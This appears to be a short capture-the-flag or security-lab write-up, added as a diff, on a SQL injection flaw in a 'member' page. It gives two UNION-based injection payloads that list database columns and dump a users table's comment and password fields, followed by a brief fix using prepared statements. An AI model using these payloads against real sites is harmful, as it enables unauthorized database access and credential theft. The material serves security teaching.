@@ -1,0 +1,10 @@
+- How -
+Go to ?page=member
+1 and 1 = 0 UNION select table_name, column_name FROM information_schema.columns 
+1 and 1 = 0 union select Commentaire, countersign from users
+
+- What is it -
+Use SQL code to access database informations.
+
+- How to avoid it -
+You need to prepare strings in your sql requests.
